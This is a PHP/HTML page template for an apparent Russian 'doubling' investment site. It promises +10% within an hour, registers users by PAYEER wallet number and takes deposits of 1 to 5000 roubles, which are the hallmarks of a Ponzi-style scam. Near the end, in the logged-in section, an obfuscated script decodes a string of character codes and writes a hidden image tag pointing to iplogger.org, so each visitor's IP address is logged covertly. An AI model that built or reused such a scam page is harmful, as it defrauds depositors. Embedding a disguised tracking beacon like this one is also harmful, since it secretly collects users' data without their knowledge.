<?
if(!defined('SKYLIGHT')){
exit();
}
date_default_timezone_set("Europe/Moscow");
?>
<html>
<head>
    <title>Твой проект</title>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<link rel="shortcut icon" href="https://www.shareicon.net/data/2017/02/09/878588_hand_512x512.png" type="image/x-icon">
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="css/main.css">
        <link rel="stylesheet" type="text/css" href="css/animate.css">
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script type="text/javascript" src="http://gostats.ru/js/counter.js"></script>
<script type="text/javascript">_gos='c4.gostats.ru';_goa=407459;
_got=5;_goi=1;_gol='анализ сайта';_GoStatsRun();</script>
<noscript><img alt="" 
src="http://c4.gostats.ru/bin/count/a_407459/t_5/i_1/counter.png" 
style="border-width:0" /></noscript>
		<script>
		$(document).ready(function(){
			setInterval(function(){
				$('.countdown').each(function(){
					var time=$(this).text().split(':');
					var timestamp=time[0]*3600+ time[1]*60+ time[2]*1;timestamp-=timestamp>0;
					var hours=Math.floor(timestamp/3600);
					var minutes=Math.floor((timestamp- hours*3600)/ 60);
					var seconds=timestamp- hours*3600- minutes*60;if(hours<10){hours='0'+ hours;}
					
				if(minutes<10){minutes='0'+ minutes;}
				if(seconds<10){seconds='0'+ seconds;}
				if(timestamp>0){
				$(this).text(hours+':'+ minutes+':'+ seconds);
				}else{
				$(this).text('В обработке');
				}
				});
		},1000);

		})
        
		</script></head>
  




<?
if(!empty($id)){
$wallet=$db->getOne("SELECT wallet FROM ss_users WHERE id=?i",$id);
?>
<?}?>
<?
$opened=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i",0));
$closed=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i",1));

$query = $db->query("SELECT COUNT(id) as allusers FROM `ss_users` WHERE 1");	
$qqq=$db->fetch($query);
$allusers=$qqq['allusers'];
$query = $db->query("SELECT SUM(summa) as summawthd FROM `deposits` WHERE status=1");	
$qqq=$db->fetch($query);
$allout=$qqq['summawthd'];
$allout2=$allout+($allout*($percent_u/100));
$allout2 = number_format($allout2, 2, '.', '');
$balance = $db->fetch($db->query("SELECT SUM(summa) AS Summa FROM deposits WHERE status=?i",0));

?>
      
<header class="header">
  <div class="header__stata">
    <div class="header__items">
      <div class="header__item">
        <span class="item__name">Старт:</span>
        <span class="item__result">01.01 в 09:00</span>
      </div>
      <div class="header__item">
        <span class="item__name">Реф.программа:</span>
        <span class="item__result"><b><?=$refpercent?>%</b></span>
      </div>
      <div class="header__item">
        <span class="item__name">Инвесторов:</span>
        <span class="item__result"><?=$allusers?></span>
      </div>
      <div class="header__item">
        <span class="item__name">Депозитов:</span>
        <span class="item__result"><b> <?=$opened?></b></span>
      </div>
      <div class="header__item">
        <span class="item__name">Выплачено:</span>
        <span class="item__result"><?=$allout2?></span>
      </div>
    </div>
  </div>
  <h1 class="header__title animated fadeInDown">УДВАИВАЙ ПРАВИЛЬНО</h1>
  <h2 class="header__subtitle">Получайте +10% дохода уже через 1 час..!</h2>
</header>      

<style type="text/css">
		
		input:focus{
background-image:none;}
		input{ border-radius:0px;}
		</style>
<?if(!empty($_error)){?><br><br><font color="red"><?=$_error?></font><br><br><?}?>
<?if(!empty($_success)){?><br><br><font color="green"><?=$_success?></font><br><br><?}?>				
<?if(empty($id)){?>		

				<form action="" method="post">	
		<input type="hidden" name="do" value="toaccount">
		<input type="hidden" name="antipovtor" value="<?=time();?>">
		
			<br>
          
<form action="" method="post" class="login">  
  <input type="hidden" name="do" value="toaccount">
  <input type="hidden" name="antipovtor" value="1518687348">
  <input  required pattern="^P[0-9]+$" title="Например: P12345678" autocomplete="on" name="wallet" placeholder="Введите PAYEER" size="30" type="text" class="login__input">
  <input type="submit" name="submit" id="form" value="Вход | Регистрация" class="login__btn">
</form>
<p class="login__description">Введите в поле выше Ваш кошелек в формате P1234567890. Нет кошелька PAYEER? <a href="https://payeer.com/06839598" target="_blank">Зарегистрируйте бесплатно!</a></p>          
          
   </form>

<?}else{?>		

<br>

<div class="hello">Вы вошли в кабинет под кошельком: <b><?=$wallet?></b></div>
 
<form action="" method="post" class="login">  
  <input type="hidden" name="do" value="payeer_pay">
  <input type="hidden" name="antipovtor" value="1518687422">
  <input  required autocomplete="off" name="m_amount"  name="amount" placeholder="от 1 до 5000 руб." size="30" type="text" value="" class="login__input">
  <input type="submit" name="submit2" id="form" value="Открыть депозит" class="login__btn">
</form>        
	

<div class="login__menu">
  <a href="/" class="login__item"><i class="fa fa-arrow-left"></i> На главную</a>
  <a href="/?page=referals" class="login__item"><i class="fa fa-money" aria-hidden="true"></i> Мои рефералы</a>
  <a href="/?page=my" class="login__item"><i class="fa fa-user" aria-hidden="true"></i> Мои депозиты</a>
  <a href="/?page=exit" class="login__item"><i class="fa fa-sign-out" aria-hidden="true"></i> Выйти из кабинета</a>
</div>

<br>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!87!70!54!50!55!34!32!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
      
      
      
<?}?>
